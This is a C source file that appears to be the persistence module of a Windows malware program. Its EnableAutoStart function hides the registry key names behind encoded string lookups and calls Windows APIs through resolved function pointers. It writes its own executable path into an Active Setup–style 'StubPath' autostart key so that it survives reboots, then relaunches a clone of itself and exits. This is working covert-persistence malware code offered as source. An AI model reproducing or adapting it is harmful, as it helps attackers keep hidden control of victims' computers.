#include "stuff.h"
#include "externals.h"

#ifndef NO_AUTOSTART

void EnableAutoStart(char *key, char *cmdline)
{
	HKEY	reg;
	char	temp[MAX_PATH];

	_snprintf(temp, sizeof(temp) - 1, "%s\\%s", strings[Decode(s_autostartreg)].encoded, key);

	fRegCreateKeyEx(HKEY_LOCAL_MACHINE, temp, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
	fGetModuleFileName(0, temp, sizeof(temp));
	fRegSetValueEx(reg, strings[Decode(s_StubPath)].encoded, 0, REG_SZ, (const unsigned char *)temp, strlen(temp));
	fRegCloseKey(reg);

#ifdef DEBUG
	printf("Registry key added.\n");
#endif

	fRegCreateKeyEx(HKEY_CURRENT_USER, strings[Decode(s_autostartreg)].encoded, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
	if (fRegDeleteKey(reg, key) == ERROR_SUCCESS)
	{
		fRegCloseKey(reg);
#ifdef DEBUG
		printf("Temp registry key removed.\n");
#endif
	}

	else
	{
		fRegCloseKey(reg);

		if (cmdline != NULL)
			if (!strcmp(cmdline, "cl"))
				return;

#ifdef DEBUG
		printf("Starting clone.\n");
#endif
		Sleep(500);
		StartClone("cl", temp, NULL);
		Sleep(500);
		ExitProcess(0);
	}
}


void DisableAutoStart(char *key)
{
	HKEY	reg;	

	fRegCreateKeyEx(HKEY_LOCAL_MACHINE, strings[Decode(s_autostartreg)].encoded, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
	fRegDeleteKey(reg, key);
	fRegCloseKey(reg);

#ifdef DEBUG
	printf("Registry key removed.\n");
#endif
}

#endif
